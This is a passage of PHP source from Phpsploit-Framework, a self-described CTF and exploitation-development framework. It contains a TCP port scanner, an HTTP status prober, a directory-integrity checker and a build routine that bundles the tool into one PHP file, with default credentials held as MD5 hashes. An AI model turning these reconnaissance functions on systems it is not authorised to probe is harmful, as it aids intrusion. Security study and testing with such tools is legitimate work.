                Class_Base_Response ::outputln ( $_key , "key : " );
                Class_Base_Response ::outputln ( $_size , "size : " );
                Class_Base_Response ::outputln ( $_value , "value : " );
            }
        } else {
            throw new \Exception( "The current environment does not support SHMOP series functions and constant definitions!" );
        }
        return null;
    }

    public static function clear ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            Class_Base_Memory ::clear ();
        }
        Class_Base_Auth ::clear_session ();
        if ( ! is_cli () ) {
            Class_Base_Response ::redirect ( "/login" );
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午3:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Default extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/index" );
            return null;
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output ( Class_View_Default::index () , "text" , 0 );
        } else {
            Class_Base_Auth::cli_show_license_agreement ();
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-2
 * Time: 下午1:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_Scan extends Class_Operate
{
    public static function request_webs ( $webs )
    {
        $_result = array ();
        if ( is_array ( $webs ) ) {
            foreach ( $webs as $index => $web ) {
                if ( is_string ( $web ) ) {
                    $_web_string_length              = strlen ( $web );
                    $_communication_protocol_header  = false;
                    $_last_separator_symbol_position = false;
                    if ( ( $_web_string_length > 7 ) ) {
                        $_tmp_string = substr ( $web , 0 , 7 );
                        if ( $_tmp_string == "http://" ) {
                            $_communication_protocol_header  = "http://";
                            $_last_separator_symbol_position = strpos ( $web , chr ( 47 ) , 7 );
                            if ( $_last_separator_symbol_position === 7 ) { // http:///
                                continue;
                            }
                        }
                    }
                    if ( ( $_web_string_length > 8 ) ) {
                        $_tmp_string = substr ( $web , 0 , 8 );
                        if ( $_tmp_string == "https://" ) {
                            $_communication_protocol_header  = "https://";
                            $_last_separator_symbol_position = strpos ( $web , chr ( 47 ) , 8 );
                            if ( $_last_separator_symbol_position === 8 ) {
                                continue;
                            }
                        }
                    }
                    if ( ( ( $_communication_protocol_header == "http://" ) || ( $_communication_protocol_header == "https://" ) ) ) {
                        if ( ( $_last_separator_symbol_position === false ) ) {
                            $_web_domain_url = $web;
                        } else {
                            $_web_domain_url = substr ( $web , 0 , $_last_separator_symbol_position );
                        }
                        $_result[ $_web_domain_url ] = self::request_web_get_httpcode ( $_web_domain_url );
                    }
                }
            }
        }
        return $_result;
    }

    public static function request_web_get_httpcode ( $web )
    {
        $request_timeout = 4;
        $_curl_handle    = curl_init ();
        curl_setopt ( $_curl_handle , CURLOPT_FOLLOWLOCATION , 1 );
        curl_setopt ( $_curl_handle , CURLOPT_RETURNTRANSFER , 1 );
        curl_setopt ( $_curl_handle , CURLOPT_HEADER , 1 );
        curl_setopt ( $_curl_handle , CURLOPT_CONNECTTIMEOUT , $request_timeout );
        curl_setopt ( $_curl_handle , CURLOPT_URL , $web );
        curl_exec ( $_curl_handle );
        $_http_code = curl_getinfo ( $_curl_handle , CURLINFO_HTTP_CODE );
        curl_close ( $_curl_handle );
        return $_http_code;

    }

    public static function request_domain_ports ( $ip , $ports )
    {
        $_result = array ();
        if ( ( is_string ( $ip ) ) && ( strlen ( $ip ) > 0 ) && ( Class_Base_Format::is_ip_address ( $ip ) ) && ( $ip != "0.0.0.0" ) && ( $ip != "255.255.255.255" ) && ( is_array ( $ports ) ) && ( count ( $ports ) > 0 ) ) {
            foreach ( $ports as $index => $port ) {
                $_key             = ( $ip . chr ( 58 ) . $port );
                $_result[ $_key ] = ( ( self::request_domain_port ( $ip , $port ) ) ? 1 : 0 );
            }
        }
        return $_result;
    }

    public static function request_domain_port ( $ip , $port )
    {
        try {
            $_socket  = Class_Base_Socket::create ( AF_INET , SOCK_STREAM , SOL_TCP );
            $_connect = Class_Base_Socket::connect ( $_socket , $ip , $port );
            return $_connect;
        } catch ( \Exception $e ) {
            try {
                Class_Base_Socket::close ( $_socket );
            } catch ( \Exception $e ) {
            }
            return false;
        }
    }

    public static function scan_directory_exception ( $sampling_directory_path , $detection_directory_path , $search_sampling_progress_id , $search_detection_progress_id , $search_errors_id , $search_result_id , $usleep = 100 , $debug = 0 )
    {
        self::forward_matching_for_scan_directory_exception ( $sampling_directory_path , $detection_directory_path , $search_sampling_progress_id , $search_detection_progress_id , $search_errors_id , $search_result_id , $usleep , $debug );
        self::reverse_matching_for_scan_directory_exception ( $detection_directory_path , $sampling_directory_path , $search_sampling_progress_id , $search_detection_progress_id , $search_errors_id , $search_result_id , $usleep , $debug );
    }

    public static function forward_matching_for_scan_directory_exception ( $sampling_directory_path , $detection_directory_path , $search_sampling_progress_id , $search_detection_progress_id , $search_errors_id , $search_result_id , $usleep = 100 , $debug = 0 )
    {
        $_current_sampling_directory_object  = null;
        $_current_detection_directory_object = null;

        if ( ( ! is_string ( $sampling_directory_path ) ) || ( strlen ( $sampling_directory_path ) <= 0 ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The sampling directory path (  <span style="color:red;">' . $sampling_directory_path . '</span> ) is invalid ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( ' The sampling directory path ( ' . $sampling_directory_path . ' ) is invalid! ' ) );
            }
            return;
        } else if ( ( ! file_exists ( $sampling_directory_path ) ) || ( ! is_dir ( $sampling_directory_path ) ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The sampling directory path ( <span style="color:red;">' . $sampling_directory_path . '</span> ) is not a valid directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'The sampling directory path ( ' . $sampling_directory_path . ' ) is not a valid directory ! ' ) );
            }
            return;
        } else if ( ( ( $_current_sampling_directory_object = dir ( $sampling_directory_path ) ) === false ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $sampling_directory_path . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( $sampling_directory_path . ' is not authorized to access, search has skipped this directory ! ' ) );
            }
            return;
        }

        if ( ( ! is_string ( $detection_directory_path ) ) || ( strlen ( $detection_directory_path ) <= 0 ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The detection directory path (  <span style="color:red;">' . $detection_directory_path . '</span> ) is invalid ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( ' The detection directory path ( ' . $detection_directory_path . ' ) is invalid! ' ) );
            }
            return;
        } else if ( ( ! file_exists ( $detection_directory_path ) ) || ( ! is_dir ( $detection_directory_path ) ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The detection directory path ( <span style="color:red;">' . $detection_directory_path . '</span> ) is not a valid directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'The detection directory path ( ' . $detection_directory_path . ' ) is not a valid directory ! ' ) );
            }
            return;
        } else if ( ( ( $_current_detection_directory_object = dir ( $detection_directory_path ) ) === false ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $detection_directory_path . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( $detection_directory_path . ' is not authorized to access, search has skipped this directory ! ' ) );
            }
            return;
        }

        if ( $_current_sampling_directory_object !== false ) {

            while ( $file = $_current_sampling_directory_object->read () ) {

                Class_Base_Response::check_browser_service_stop ();

                if ( $file !== false ) {

                    $_current_child_item = ( $sampling_directory_path . "/" . $file );

                    if ( ! is_cli () ) {
                        Class_Base_Response::output_div_inner_html ( $search_sampling_progress_id , ( 'Current sampling path: <span style="color:red;">' . ( $sampling_directory_path . "/" . $file ) . '</span> ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                    } else {
                        Class_Base_Response::outputln ( ( 'Current sampling path: ' . ( $sampling_directory_path . "/" . $file ) ) );
                    }

                    if ( ! is_cli () ) {
                        Class_Base_Response::output_div_inner_html ( $search_detection_progress_id , ( 'Current detection path: <span style="color:red;">' . ( $detection_directory_path . "/" . $file ) . '</span> ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                    } else {
                        Class_Base_Response::outputln ( ( 'Current detection path: ' . ( $detection_directory_path . "/" . $file ) ) );
                    }

                    if ( is_dir ( $_current_child_item ) && ( $_current_child_item != ( $sampling_directory_path . "/." ) ) && ( $_current_child_item != ( $sampling_directory_path . "/.." ) ) ) {

                        $_current_sampling_child_directory  = ( $sampling_directory_path . "/" . $file );
                        $_current_detection_child_directory = ( $detection_directory_path . "/" . $file );

                        if ( ( ! file_exists ( $_current_detection_child_directory ) ) || ( ! is_dir ( $_current_detection_child_directory ) ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_div_inner_html ( $search_result_id , ( 'Detected abnormality ! After sample comparison, the current detection directory (  <span style="color:red;">' . $_current_detection_child_directory . '</span> ) is missing ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( ( 'Detected abnormality ! After sample comparison, the current detection directory ( ' . $_current_detection_child_directory . ' ) is missing ! ' ) );
                            }
                        } else {
                            self::scan_directory_exception ( $_current_sampling_child_directory , $_current_detection_child_directory , $search_sampling_progress_id , $search_errors_id , $search_result_id , $usleep , $debug );
                        }

                    } else if ( is_file ( $_current_child_item ) ) {

                        $_current_sampling_child_file  = ( $sampling_directory_path . "/" . $file );
                        $_current_detection_child_file = ( $detection_directory_path . "/" . $file );

                        if ( ( ! file_exists ( $_current_detection_child_file ) ) || ( ! is_file ( $_current_detection_child_file ) ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_div_inner_html ( $search_result_id , ( 'Detected abnormality ! After sample comparison, the current detection file ( <span style="color:red;">' . $_current_detection_child_file . '</span> ) is missing ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( ( 'Detected abnormality ! After sample comparison, the current detection file ( ' . $_current_detection_child_file . ' ) is missing ! ' ) );
                            }
                        } else {
                            self::calculate_content_matching ( $_current_sampling_child_file , $_current_detection_child_file , $search_errors_id , $search_result_id );
                        }
                    }
                }
            }
        }
    }

    public static function reverse_matching_for_scan_directory_exception ( $detection_directory_path , $sampling_directory_path , $search_sampling_progress_id , $search_detection_progress_id , $search_errors_id , $search_result_id , $usleep = 100 , $debug = 0 )
    {
        $_current_detection_directory_object = null;
        $_current_sampling_directory_object  = null;

        if ( ( ! is_string ( $detection_directory_path ) ) || ( strlen ( $detection_directory_path ) <= 0 ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The detection directory path (  <span style="color:red;">' . $detection_directory_path . '</span> ) is invalid ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( ' The detection directory path ( ' . $detection_directory_path . ' ) is invalid! ' ) );
            }
            return;
        } else if ( ( ! file_exists ( $detection_directory_path ) ) || ( ! is_dir ( $detection_directory_path ) ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The detection directory path ( <span style="color:red;">' . $detection_directory_path . '</span> ) is not a valid directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'The detection directory path ( ' . $detection_directory_path . ' ) is not a valid directory ! ' ) );
            }
            return;
        } else if ( ( ( $_current_detection_directory_object = dir ( $detection_directory_path ) ) === false ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $detection_directory_path . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'Directory ' . $detection_directory_path . ' is not authorized to access, search has skipped this directory ! ' ) );
            }
            return;
        }

        if ( ( ! is_string ( $sampling_directory_path ) ) || ( strlen ( $sampling_directory_path ) <= 0 ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The sampling directory path (  <span style="color:red;">' . $sampling_directory_path . '</span> ) is invalid ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( ' The sampling directory path ( ' . $sampling_directory_path . ' ) is invalid! ' ) );
            }
            return;
        } else if ( ( ! file_exists ( $sampling_directory_path ) ) || ( ! is_dir ( $sampling_directory_path ) ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'The sampling directory path ( <span style="color:red;">' . $sampling_directory_path . '</span> ) is not a valid directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'The sampling directory path ( ' . $sampling_directory_path . ' ) is not a valid directory ! ' ) );
            }
            return;
        } else if ( ( ( $_current_sampling_directory_object = dir ( $sampling_directory_path ) ) === false ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'Directory <span style="color:red;">' . $sampling_directory_path . '</span> is not authorized to access, search has skipped this directory' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'Directory ' . $sampling_directory_path . ' is not authorized to access, search has skipped this directory ! ' ) );
            }
            return;
        }

        if ( $_current_detection_directory_object !== false ) {

            while ( $file = $_current_detection_directory_object->read () ) {

                Class_Base_Response::check_browser_service_stop ();

                if ( $file !== false ) {

                    $_current_child_item = ( $detection_directory_path . "/" . $file );

                    if ( ! is_cli () ) {
                        Class_Base_Response::output_div_inner_html ( $search_detection_progress_id , ( 'Current detection path: <span style="color:red;">' . ( $detection_directory_path . "/" . $file ) . '</span> ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                    } else {
                        Class_Base_Response::outputln ( ( 'Current detection path: ' . ( $detection_directory_path . "/" . $file ) ) );
                    }

                    if ( ! is_cli () ) {
                        Class_Base_Response::output_div_inner_html ( $search_sampling_progress_id , ( 'Current sampling path: <span style="color:red;">' . ( $sampling_directory_path . "/" . $file ) . '</span> ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                    } else {
                        Class_Base_Response::outputln ( ( 'Current sampling path: ' . ( $sampling_directory_path . "/" . $file ) ) );
                    }

                    if ( is_dir ( $_current_child_item ) && ( $_current_child_item != ( $detection_directory_path . "/." ) ) && ( $_current_child_item != ( $detection_directory_path . "/.." ) ) ) {

                        $_current_detection_child_directory = ( $detection_directory_path . "/" . $file );
                        $_current_sampling_child_directory  = ( $sampling_directory_path . "/" . $file );


                        if ( ( ! file_exists ( $_current_sampling_child_directory ) ) || ( ! is_dir ( $_current_sampling_child_directory ) ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_div_inner_html ( $search_result_id , ( 'There is an abnormality in the current detected directory (  <span style="color:red;">' . $_current_detection_child_directory . '</span>  ), and the corresponding sample cannot be found in the sample directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( ( 'There is an abnormality in the current detected directory ( ' . $_current_detection_child_directory . ' ), and the corresponding sample cannot be found in the sample directory ! ' ) );
                            }
                        } else {
                            self::scan_directory_exception ( $_current_detection_child_directory , $_current_sampling_child_directory , $search_sampling_progress_id , $search_errors_id , $search_result_id , $usleep , $debug );
                        }

                    } else if ( is_file ( $_current_child_item ) ) {

                        $_current_detection_child_file = ( $detection_directory_path . "/" . $file );
                        $_current_sampling_child_file  = ( $sampling_directory_path . "/" . $file );

                        if ( ( ! file_exists ( $_current_sampling_child_file ) ) || ( ! is_file ( $_current_sampling_child_file ) ) ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_div_inner_html ( $search_result_id , ( 'The currently detected file ( <span style="color:red;">' . $_current_detection_child_file . '</span> ) has an exception, and the corresponding sampling cannot be found in the sampling directory ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( ( 'The currently detected file ( ' . $_current_detection_child_file . ' ) has an exception, and the corresponding sampling cannot be found in the sampling directory ! ' ) );
                            }
                        } else {
                            self::calculate_content_matching ( $_current_sampling_child_file , $_current_detection_child_file , $search_errors_id , $search_result_id );
                        }
                    }
                }
            }
        }
    }

    public static function calculate_content_matching ( $current_sampling_child_file , $current_detection_child_file , $search_errors_id , $search_result_id )
    {
        $_is_error                          = false;
        $_is_exception                      = false;
        $_current_sampling_child_file_size  = Class_Base_File::get_file_size ( $current_sampling_child_file );
        $_current_detection_child_file_size = Class_Base_File::get_file_size ( $current_detection_child_file );
        if ( $_current_sampling_child_file_size === false ) {
            $_is_error = true;
        } else if ( $_current_detection_child_file_size === false ) {
            $_is_error = true;
        } else if ( $_current_sampling_child_file_size != $_current_detection_child_file_size ) {
            $_is_exception = true;
        } else {
            $_current_sampling_child_file_md5  = md5_file ( $current_sampling_child_file );
            $_current_detection_child_file_md5 = md5_file ( $current_detection_child_file );
            if ( $_current_sampling_child_file_md5 === false ) {
                $_is_error = true;
            } else if ( $_current_detection_child_file_md5 === false ) {
                $_is_error = true;
            } else if ( $_current_sampling_child_file_md5 != $_current_detection_child_file_md5 ) {
                $_is_exception = true;
            } else {
                $_current_sampling_child_file_sha1  = sha1_file ( $current_sampling_child_file );
                $_current_detection_child_file_sha1 = sha1_file ( $current_detection_child_file );
                if ( $_current_sampling_child_file_sha1 === false ) {
                    $_is_error = true;
                } else if ( $_current_detection_child_file_sha1 === false ) {
                    $_is_error = true;
                } else if ( $_current_sampling_child_file_sha1 != $_current_detection_child_file_sha1 ) {
                    $_is_exception = true;
                }
            }
        }
        if ( ! empty( $_is_error ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_errors_id , ( 'An error occurred during the matching detection between the target file ( <span style="color:red;">' . $current_detection_child_file . '</span> ) and the sample file (  ' . $current_sampling_child_file . ' ) ! Unable to successfully perform matching detection ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'An error occurred during the matching detection between the target file ( ' . $current_detection_child_file . ' ) and the sample file ( ' . $current_sampling_child_file . ' ) ! Unable to successfully perform matching detection ! ' ) );
            }
        }
        if ( ! empty( $_is_exception ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_div_inner_html ( $search_result_id , ( 'During matching detection between the target file ( <span style="color:red;">' . $current_detection_child_file . '</span> ) and the sample file ( <span style="color:red;">' . $current_sampling_child_file . '</span> ) , it was found that the matching results were inconsistent ! There may be an issue with the target file ( <span style="color:red;">' . $current_detection_child_file . '</span> ) , please check for any abnormalities ! ' ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( 'During matching detection between the target file ( ' . $current_detection_child_file . ' ) and the sample file ( ' . $current_sampling_child_file . ' ) , it was found that the matching results were inconsistent ! There may be an issue with the target file ( ' . $current_detection_child_file . ' ) , please check for any abnormalities ! ' ) );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-6-3
 * Time: 下午8:16
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_Build
{
    private static $_current_file             = null;
    private static $_current_directory        = null;
    private static $_current_directory_object = null;
    private static $_current_new_file         = null;
    private static $_base_interfaces          = array (
        'Interface_Root' ,
        'Interface_Base' ,
        'Interface_Operate' ,
        'Interface_Controller' ,
        'Interface_View' ,
        'Interface_Main' ,
        'Interface_Base_Error' ,
        'Interface_Base_Exception' ,
        'Interface_Base_Request' ,
        'Interface_Base_Response' ,
        'Interface_Base_Memory' ,
        'Interface_Base_BlockName' ,
        'Interface_Base_BlockKey' ,
        'Interface_Base_BlockSize' ,
        'Interface_Base_BlockStatus' ,
        'Interface_Base_BlockMode' ,
        'Interface_Base_BlockType' ,
        'Interface_Base_BlockContentType' ,
        'Interface_Base_BlockReserved' ,
        'Interface_Base_BlockHeadEndFlag' ,
        'Interface_Base_BlockHead' ,
        'Interface_Base_BlockContent' ,
        'Interface_Base_BlockEndFlag' ,
        'Interface_Base_Block' ,
        'Interface_Base_Block_IndexesItem' ,
        'Interface_Base_Block_UniqueIndex' ,
        'Interface_Base_Block_Indexes' ,
        'Interface_Base_FormatType' ,
        'Interface_Base_Format' ,
        'Interface_Base_Document' ,
        'Interface_Base_Socket' ,
        'Interface_Base_RawSocket' ,
        'Interface_Base_Security' ,
        'Interface_Operate_User' ,
        'Interface_Base_Lock' ,
        'Interface_Base_File' ,
    );

    private static $_base_classes = array (
        'Class_Root' ,
        'Class_Base' ,
        'Class_Operate' ,
        'Class_Controller' ,
        'Class_View' ,
        'Class_Main' ,
        'Class_Base_Error' ,
        'Class_Base_Exception' ,
        'Class_Base_Extension' ,
        'Class_Base_Request' ,
        'Class_Base_Response' ,
        'Class_Base_Format' ,
        'Class_Base_Memory' ,
        'Class_Base_Block' ,
        'Class_Base_Document' ,
    );

    public static function get_current_file ()
    {
        return self::$_current_file = __FILE__;
    }

    public static function get_current_directory ()
    {
        return self::$_current_directory = dirname ( __FILE__ );
    }

    public static function get_current_directory_object ()
    {
        if ( ( empty( self::$_current_directory_object ) ) || ( ! is_object ( self::$_current_directory_object ) ) ) {
            $_current_directory              = self::get_current_directory ();
            self::$_current_directory_object = dir ( $_current_directory );
        }
        return self::$_current_directory_object;
    }

    public static function create_current_directory_object ()
    {
        if ( ( ! empty( self::$_current_directory_object ) ) || ( is_object ( self::$_current_directory_object ) ) ) {
            self::$_current_directory_object = null;
        }
        $_current_directory              = self::get_current_directory ();
        self::$_current_directory_object = dir ( $_current_directory );
        return self::$_current_directory_object;
    }

    public static function clear_current_directory_object ()
    {
        self::$_current_directory_object = null;
        return self::$_current_directory_object;
    }

    public static function get_new_file_name ( $type_string = "lite" )
    {
        if ( ( $type_string != "lite" ) && ( $type_string != "full" ) ) {
            $type_string = "lite";
        }
        $_new_file_name = ( ( "build_" ) . ( $type_string ) . ( "_" ) . ( ( time () . rand ( 10000000 , 99999999 ) ) . chr ( 46 ) . ( "phpsploit" ) . chr ( 46 ) . ( "php" ) ) );
        return $_new_file_name;
    }

    public static function get_new_file_path ( $type_string = "lite" )
    {
        $_new_file_name = ( ( self::get_current_directory () ) . chr ( 47 ) . ( self::get_new_file_name ( $type_string ) ) );
        return $_new_file_name;
    }

    public static function exist_new_file ()
    {
        if ( ( is_string ( self::$_current_new_file ) ) && ( strlen ( self::$_current_new_file ) > 0 ) ) {
            if ( file_exists ( self::$_current_new_file ) && is_file ( self::$_current_new_file ) ) {
                return true;
            }
        }
        return false;
    }

    public static function get_file_list ()
    {
        $_file_list                = array ();
        $_current_directory        = self::get_current_directory ();
        $_current_directory_object = self::get_current_directory_object ();
        if ( $_current_directory_object !== false ) {
            while ( $_current_directory_file_name = $_current_directory_object->read () ) {
                $_current_directory_file = ( $_current_directory . chr ( 47 ) . $_current_directory_file_name );
                if ( file_exists ( $_current_directory_file ) && is_file ( $_current_directory_file ) ) {
                    $_file_list[] = $_current_directory_file;
                }
            }
        }
        return $_file_list;
    }

    public static function get_class_or_interface_name_in_file_path ( $file_path )
    {
        if ( ( ! is_string ( $file_path ) ) || ( strlen ( $file_path ) <= 0 ) ) {
            throw new \Exception( ( "The file_path is not a string, or the length of the file_path is less than or equal to 0 , file_path : " . print_r ( $file_path , true ) ) , 0 );
        }
        $file_path                     = str_replace ( "\\" , "/" , $file_path );
        $_file_path_length             = strlen ( $file_path );
        $_file_path_separator_position = false;
        $_file_name_separator_position = false;
        for ( $index = ( $_file_path_length - 1 ) ; $index >= 0 ; $index -- ) {
            $_char = substr ( $file_path , $index , 1 );
            if ( $_char == "/" ) {
                $_file_path_separator_position = $index;
                break;
            }
        }
        for ( $index = ( $_file_path_length - 1 ) ; $index >= 0 ; $index -- ) {
            $_char = substr ( $file_path , $index , 1 );
            if ( $_char == "." ) {
                $_file_name_separator_position = $index;
                break;
            }
        }
        $_class_or_interface_name_start_position = 0;
        $_class_or_interface_name_end_position   = ( $_file_path_length - 1 );
        if ( ( $_file_path_separator_position !== false ) && ( ( $_file_path_separator_position + 1 ) < $_file_path_length ) ) {
            $_class_or_interface_name_start_position = ( $_file_path_separator_position + 1 );
        }
        if ( ( $_file_name_separator_position !== false ) && ( $_file_name_separator_position < $_file_path_length ) ) {
            $_class_or_interface_name_end_position = $_file_name_separator_position;
        }
        $_file_name = substr ( $file_path , $_class_or_interface_name_start_position , ( $_class_or_interface_name_end_position - $_class_or_interface_name_start_position ) );
        return $_file_name;
    }

    public static function init_new_file ( $current_new_file )
    {
        if ( ( ! is_string ( $current_new_file ) ) || ( strlen ( $current_new_file ) <= 0 ) ) {
            throw new \Exception( ( "The current_new_file is not a string, or the length of the current_new_file is less than or equal to 0 , current_new_file : " . print_r ( $current_new_file , true ) ) , 0 );
        }
        if ( ! file_exists ( $current_new_file ) ) {
            $_tmp_file_point = @fopen ( $current_new_file , "w+" );
            if ( ! empty( $_tmp_file_point ) ) {
                fwrite ( $_tmp_file_point , "<?php\n" );
                @fclose ( $_tmp_file_point );
            } else {
                throw new \Exception( "file " . $current_new_file . " is init error" , 0 );
            }
        }
    }

    public static function is_default_pivilege_user_password ()
    {
        if ( ( ! defined ( "PRIVILEGE_USER_MODULE_USER" ) ) || ( empty( PRIVILEGE_USER_MODULE_USER ) ) ) {
            return true;
        }
        if ( ( ! defined ( "PRIVILEGE_USER_MODULE_PASSWORD" ) ) || ( empty( PRIVILEGE_USER_MODULE_PASSWORD ) ) ) {
            return true;
        }
        if ( ( PRIVILEGE_USER_MODULE_USER != "38305ac7e5f1b870f6e92aef5e281b2d" ) && ( PRIVILEGE_USER_MODULE_PASSWORD != "6f02faa1775d964e58b227e0ef3fa7fd" ) ) {
            return false;
        }
        return true;
    }

    public static function is_build_envement ()
    {
        $_current_directory   = self::get_current_directory ();
        $_interface_root      = "Interface_Root";
        $_class_root          = "Class_Root";
        $_interface_root_file = ( $_current_directory . '/' . $_interface_root . '.php' );
        $_class_root_file     = ( $_current_directory . '/' . $_class_root . '.php' );
        if ( ( file_exists ( $_interface_root_file ) && ( is_file ( $_interface_root_file ) ) ) && ( file_exists ( $_class_root_file ) && ( is_file ( $_class_root_file ) ) ) ) {
            return true;
        }
        return false;
    }

    public static function create_new_full_file ( $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( self::is_default_pivilege_user_password () ) {
            if ( is_cli () ) {
